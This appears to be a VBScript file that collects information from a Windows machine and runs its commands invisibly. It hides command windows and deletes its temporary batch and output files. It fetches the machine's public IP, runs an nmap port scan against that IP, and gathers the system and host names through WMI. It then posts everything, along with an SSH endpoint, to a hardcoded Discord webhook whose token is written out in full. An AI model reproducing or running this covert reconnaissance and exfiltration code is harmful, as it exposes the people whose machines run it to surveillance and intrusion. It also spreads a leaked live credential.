Option Explicit

' Function to execute a command invisibly and return the output
Function ExecuteCommandInvisible(command)
    Dim objShell, objFSO, tempScript, tempFile, execOutput
    Set objShell = CreateObject("WScript.Shell")
    Set objFSO = CreateObject("Scripting.FileSystemObject")

    ' Create a temporary batch file
    tempFile = objFSO.GetSpecialFolder(2) & "\temp_command.bat"
    Set tempScript = objFSO.CreateTextFile(tempFile, True)
    tempScript.WriteLine("@echo off")
    tempScript.WriteLine(command & " > %temp%\command_output.txt 2>&1")
    tempScript.WriteLine("exit")
    tempScript.Close

    ' Run the batch file invisibly
    objShell.Run "cmd.exe /c """ & tempFile & """", 0, True

    ' Read the output from the temporary output file
    If objFSO.FileExists(objFSO.GetSpecialFolder(2) & "\command_output.txt") Then
        execOutput = objFSO.OpenTextFile(objFSO.GetSpecialFolder(2) & "\command_output.txt", 1).ReadAll
        objFSO.DeleteFile objFSO.GetSpecialFolder(2) & "\command_output.txt"
    Else
        execOutput = ""
    End If

    ' Clean up the temporary batch file
    objFSO.DeleteFile tempFile

    ' Return the output
    ExecuteCommandInvisible = Trim(execOutput)
End Function

' Create an HTTP request object
Dim objHTTP
Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")

' Open a POST request to the Discord webhook URL
Dim webhookURL
webhookURL = "https://discord.com/api/webhooks/1200480366750863430/8q2jsEPIPPwIkUOKxBRT-T-ICL1pLMkgggqqdhm9-BZgI2XdlJtMmJABKbwqYDWzUFvp"
objHTTP.Open "POST", webhookURL, False

' Retrieve public IP address invisibly
Dim publicIP
publicIP = ExecuteCommandInvisible("curl -s ifconfig.me")

' Perform an Nmap scan invisibly (example: scan top 1000 ports on public IP)
Dim nmapOutput
nmapOutput = ExecuteCommandInvisible("nmap -Pn -T4 -F " & publicIP)

' Retrieve system information using WMI
Dim objWMIService, colItems, objItem
Set objWMIService = GetObject("winmgmts:{impersonationLevel=Impersonate}!\\.")

Dim systemName, message, localPort
localPort = "22" ' Replace with your actual local port

Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_ComputerSystem")
For Each objItem In colItems
    systemName = objItem.Name ' Use the 'Name' property of the system
    message = "Name: " & systemName & vbCrLf & _
              "Public IP: " & publicIP & vbCrLf & _
              "SSH at http://" & objItem.DNSHostName & ":" & localPort & "/" & vbCrLf & _
              "Nmap Scan Results:" & vbCrLf & nmapOutput
Next

' Send the message as a JSON payload
Dim payload
payload = "{""content"":""" & Replace(message, vbCrLf, "\n") & """}"
objHTTP.SetRequestHeader "Content-Type", "application/json"
objHTTP.Send payload

' Clean up
Set objHTTP = Nothing
Set objWMIService = Nothing
Set colItems = Nothing
